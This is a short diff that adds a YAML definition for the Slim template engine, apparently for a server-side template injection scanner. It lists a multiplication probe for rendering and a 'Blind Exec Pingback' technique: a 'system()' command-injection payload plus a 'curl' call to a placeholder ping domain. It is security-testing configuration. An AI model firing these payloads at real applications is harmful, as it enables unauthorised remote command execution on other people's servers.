@@ -1,0 +1,14 @@
+name: Slim
+contexts:
+  - begin: "#{"
+    end: "}"
+    level: 1
+attack_techniques:
+  - technique: "Render"
+    payloads:
+      - "{{.FirstNum}}*{{.SecondNum}}"
+  - technique: "Blind Exec Pingback"
+    payloads:
+      - 'system( "{{.Cmd}}" )'
+    commands:
+      - "curl {{.PingDomain}}"
